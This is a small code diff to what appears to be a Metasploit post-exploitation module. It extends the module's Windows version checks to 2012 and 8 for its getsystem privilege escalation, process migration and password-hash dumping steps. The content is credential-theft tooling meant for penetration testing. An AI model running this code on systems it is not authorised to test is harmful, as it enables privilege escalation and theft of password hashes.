@@ -447,7 +447,7 @@ class Metasploit3 < Msf::Post
 					rescue::Exception => e
 						print_error("Failed to dump hashes as SYSTEM, trying to migrate to another process")
 
-						if sysinfo['OS'] =~ /(Windows 2008)/i
+						if sysinfo['OS'] =~ /Windows (2008|2012)/i
 							move_to_sys
 							file_local_write(pwdfile,inject_hashdump)
 						else
@@ -474,7 +474,7 @@ class Metasploit3 < Msf::Post
 							results = session.priv.getsystem
 							if results[0]
 								print_good("Got SYSTEM privilege")
-								if session.sys.config.sysinfo['OS'] =~ /(Windows 2008)/i
+								if session.sys.config.sysinfo['OS'] =~ /Windows (2008|2012)/i
 									# Migrate process since on Windows 2008 R2 getsystem
 									# does not set certain privilege tokens required to
 									# inject and dump the hashes.
@@ -489,7 +489,7 @@ class Metasploit3 < Msf::Post
 						end
 
 					end
-				elsif sysinfo['OS'] =~ /(Windows 7|2008|Vista)/i
+				elsif sysinfo['OS'] =~ /Windows (7|8|2008|2012|Vista)/i
 					if migrate_system
 						print_status("Trying to get SYSTEM privilege")
 						results = session.priv.getsystem
